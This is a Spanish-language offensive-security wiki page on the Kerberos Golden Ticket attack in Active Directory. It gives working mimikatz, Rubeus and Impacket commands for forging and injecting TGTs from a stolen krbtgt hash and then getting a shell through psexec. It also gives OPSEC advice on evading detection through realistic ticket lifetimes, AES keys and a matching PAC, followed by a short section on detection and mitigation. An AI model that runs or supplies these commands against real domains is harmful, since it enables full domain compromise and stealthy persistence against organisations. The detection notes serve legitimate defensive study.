# Golden Ticket

{{#include ../../banners/hacktricks-training.md}}

## Golden ticket

Un ataque de **Golden Ticket** consiste en la **creación de un Ticket Granting Ticket (TGT) legítimo suplantando a cualquier usuario** mediante el uso del **hash NTLM de la cuenta krbtgt de Active Directory (AD)**. Esta técnica es particularmente ventajosa porque **permite acceso a cualquier servicio o máquina** dentro del dominio como el usuario suplantado. Es crucial recordar que las **credenciales de la cuenta krbtgt nunca se actualizan automáticamente**.

Para **obtener el hash NTLM** de la cuenta krbtgt, se pueden emplear varios métodos. Puede extraerse del proceso **Local Security Authority Subsystem Service (LSASS)** o del archivo **NT Directory Services (NTDS.dit)** ubicado en cualquier Domain Controller (DC) dentro del dominio. Además, **ejecutar un ataque DCsync** es otra estrategia para obtener este hash NTLM, que puede realizarse usando herramientas como el módulo **lsadump::dcsync** en Mimikatz o el script **secretsdump.py** de Impacket. Es importante subrayar que para llevar a cabo estas operaciones, **normalmente se requieren privilegios de administrador de dominio o un nivel de acceso مشابهante**.

Aunque el hash NTLM sirve como un método viable para este propósito, se **recomienda encarecidamente** **forjar tickets usando las claves Kerberos del Advanced Encryption Standard (AES) (AES128 y AES256)** por razones de seguridad operacional. Esto es aún más importante en dominios modernos porque el uso de **RC4** se está eliminando gradualmente y destaca mucho más claramente en la telemetría de Kerberos.
```bash:From Linux
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```

```bash:From Windows
# Rubeus
## The /ldap command will get the details from the LDAP (so you don't need to put the SID)
## The /printcmd option will print the complete command if later you want to generate a token offline
.\Rubeus.exe golden /rc4:<krbtgt_hash> /domain:<child_domain> /sid:<child_domain_sid> /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd

# Example
.\Rubeus.exe golden /rc4:25b2076cda3bfd6209161a6c78a69c1c /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /user:stegosaurus /ptt /ldap /nowrap

#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
### Notas modernas sobre la creación de tickets

Cuando sea posible, **consulta primero LDAP y SYSVOL** y luego forja el ticket usando la política real del dominio y los valores PAC del usuario en lugar de inventarlos manualmente:
```bash
Rubeus.exe golden /aes256:<krbtgt_aes256> /user:<username> /ldap /printcmd /nowrap
```
- `/ldap` pide al DC los datos del usuario, grupo, NetBIOS y directiva usados para construir un PAC más realista.
- `/printcmd` imprime una línea de comando offline que contiene los campos del PAC recuperados, lo cual es útil si luego quieres forjar el mismo ticket sin volver a tocar LDAP.
- `/extendedupndns` añade los nuevos elementos `UpnDns` del PAC que contienen `samAccountName` y el SID de la cuenta.
- `/oldpac` elimina los nuevos buffers `Requestor` y `Attributes` del PAC; esto es principalmente útil para pruebas de compatibilidad contra entornos antiguos, no para tradecraft por defecto.

Desde Linux, las versiones recientes de Impacket también soportan añadir las nuevas estructuras del PAC y establecer un período de validez realista:
```bash
python3 ticketer.py -aesKey <krbtgt_aes256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-user-id 500 -groups 512,513,518,519 -duration 10 \
-extra-pac administrator
```
- `-duration` está en **horas**. El valor predeterminado es **10 years**, lo cual es ruidoso.
- `-extra-pac` añade la información PAC más nueva de `UPN_DNS`.
- `-old-pac` fuerza el diseño heredado de PAC.
- `-extra-sid` es útil cuando el PAC necesita SIDs adicionales (por ejemplo, en escenarios de escalada de child-to-parent, que se cubren en [SID-History Injection](sid-history-injection.md)).

**Una vez** que hayas **inyectado el golden Ticket**, puedes acceder a los archivos compartidos **(C$)**, y ejecutar services y WMI, así que podrías usar **psexec** o **wmiexec** para obtener una shell (parece que no puedes obtener una shell mediante winrm).

### Bypassing common detections

Las formas más frecuentes de detectar un golden ticket son **inspeccionando el tráfico Kerberos** en la red. Por defecto, Mimikatz **firma el TGT durante 10 years**, lo que destacará como anómalo en las posteriores solicitudes TGS hechas con él.

`Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`

Usa los parámetros `/startoffset`, `/endin` y `/renewmax` para controlar el desplazamiento inicial, la duración y las renovaciones máximas (todo en minutos).
```
Get-DomainPolicy | select -expand KerberosPolicy
```
Desafortunadamente, la vida útil del TGT no se registra en los 4769, así que no encontrarás esta información en los Windows event logs. Sin embargo, lo que sí puedes correlacionar es **ver 4769 sin un 4768 previo**. **No es posible solicitar un TGS sin un TGT**, y si no hay registro de que se haya emitido un TGT, podemos inferir que fue falsificado offline.

En **nuevas versiones de Windows**, los Event IDs **4768** y **4769** también exponen una **telemetría del tipo de cifrado** mucho mejor. Un TGT/TGS falsificado usando **RC4 (`0x17`)** en un dominio donde `krbtgt`, los clients y los services ya tienen claves AES es mucho más fácil de detectar que hace unos años. Esta es otra razón para preferir **Golden Tickets respaldados por AES** y para ajustar el comportamiento normal de Kerberos del dominio lo más posible.

Otro problema de OPSEC es la **fidelidad del PAC**. Tickets con membresías de grupos imposibles, buffers PAC nuevos que faltan, o metadata de la cuenta que no coincide con LDAP son más fáciles de detectar cuando los defenders validan el contenido del PAC contra los datos de AD. Si necesitas un TGT que parezca realmente emitido por un DC, revisa:

{{#ref}}
diamond-ticket.md
{{#endref}}

También existen **límites ambientales** para la persistencia. La cuenta `krbtgt` mantiene un **historial de contraseñas de 2**, así que un TGT falsificado puede seguir siendo válido tras el **primer** reset de `krbtgt` si fue firmado con la clave anterior. Por eso los defenders invalidan los Golden Tickets **reseteando `krbtgt` dos veces** y esperando al menos el tiempo máximo de vida del ticket del dominio entre resets.

Para **evadir esta detección** revisa los diamond tickets.

### Mitigation

- 4624: Account Logon
- 4672: Admin Logon
- `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

Otros pequeños trucos que pueden hacer los defenders son **alertar sobre 4769 para usuarios sensibles** como la cuenta de administrador por defecto del dominio y alertar sobre el **uso de RC4 para `krbtgt`** en dominios que normalmente emiten tickets AES.

## References

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)
- [https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-the-krbtgt-password](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-the-krbtgt-password)
- [https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

{{#include ../../banners/hacktricks-training.md}}
